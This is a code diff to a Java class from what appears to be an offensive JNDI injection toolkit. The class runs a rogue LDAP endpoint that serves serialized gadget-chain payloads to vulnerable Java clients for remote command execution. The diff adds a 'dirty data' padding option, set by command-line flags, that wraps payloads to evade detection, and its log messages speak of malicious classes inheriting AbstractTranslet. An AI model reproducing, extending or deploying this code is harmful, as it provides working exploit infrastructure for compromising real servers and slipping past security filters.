@@ -5,8 +5,10 @@ import com.nu1r.jndi.enumtypes.PayloadType;
 import com.nu1r.jndi.exceptions.IncorrectParamsException;
 import com.nu1r.jndi.exceptions.UnSupportedGadgetTypeException;
 import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
+import com.nu1r.jndi.gadgets.Config.Config;
 import com.nu1r.jndi.gadgets.ObjectPayload;
 import com.nu1r.jndi.gadgets.utils.Util;
+import com.nu1r.jndi.gadgets.utils.dirty.DirtyDataWrapper;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -15,9 +17,7 @@ import com.unboundid.ldap.sdk.ResultCode;
 import java.io.ByteArrayOutputStream;
 import java.io.ObjectOutputStream;
 
-import static com.nu1r.jndi.gadgets.utils.Utils.getByte;
-import static com.nu1r.jndi.gadgets.Config.Config.IS_INHERIT_ABSTRACT_TRANSLET;
-import static com.nu1r.jndi.gadgets.Config.Config.URL_PATTERN;
+import static com.nu1r.jndi.gadgets.Config.Config.*;
 import static org.fusesource.jansi.Ansi.ansi;
 
 @LdapMapping(uri = {"/deserialization"})
@@ -31,20 +31,28 @@ public class SerializedDataController implements LdapController {
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Send LDAP result for |@" + base + " @|MAGENTA with javaSerializedData attribute|@"));
         Entry                                e            = new Entry(base);
-        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
-        ObjectPayload                        payload      = payloadClass.newInstance();
-        Object                               object       = payload.getObject(payloadType, params);
-        //序列化
-        ByteArrayOutputStream                baous        = new ByteArrayOutputStream();
-        ObjectOutputStream                   oos          = new ObjectOutputStream(baous);
-        oos.writeObject(object);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
 
-        e.addAttribute("javaClassName", "foo");
-        e.addAttribute("javaSerializedData", bytes);
-        result.sendSearchEntry(e);
-        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        try {
+            final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(String.valueOf(gadgetType));
+            ObjectPayload                        payload      = payloadClass.newInstance();
+            Object                               object       = payload.getObject(payloadType, params);
+            if (dirtyType && dirtyLength) {
+                object = new DirtyDataWrapper(object, Type1, Length1).doWrap();
+            }
+            ByteArrayOutputStream baous = new ByteArrayOutputStream(); //序列化
+            ObjectOutputStream    oos   = new ObjectOutputStream(baous);
+            oos.writeObject(object);
+            byte[] bytes = baous.toByteArray();
+            oos.close();
+
+            e.addAttribute("javaClassName", "foo");
+            e.addAttribute("javaSerializedData", bytes);
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        } catch (Throwable er) {
+            System.err.println("Error while generating or serializing payload");
+            er.printStackTrace();
+        }
     }
 
     @Override
@@ -76,12 +84,22 @@ public class SerializedDataController implements LdapController {
                         String[] U = cmd.split("-");
                         int      i = U.length;
                         if (i >= 1) {
-                            URL_PATTERN = U[0];
+                            params = new String[]{U[0]};
                             System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + U[0]));
                         }
-                        if (cmd.contains("AbstractTranslet")) {
+                        if (cmd.contains("inherit")) {
                             IS_INHERIT_ABSTRACT_TRANSLET = true;
-                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 恶意类继承 AbstractTranslet |@"));
+                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 继承恶意类 AbstractTranslet |@"));
+                        }
+                        if (cmd.contains("dt")) {
+                            dirtyType = true;
+                            Type1 = Integer.parseInt(U[2]);
+                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 脏数据类型 >> |@" + U[2]));
+                        }
+                        if (cmd.contains("dl")) {
+                            dirtyLength = true;
+                            Length1 = Integer.parseInt(U[4]);
+                            System.out.println(ansi().render("@|green [+]|@ @|MAGENTA 脏数据大小 >> |@" + U[4]));
                         }
                     } else {
                         params = new String[]{cmd};
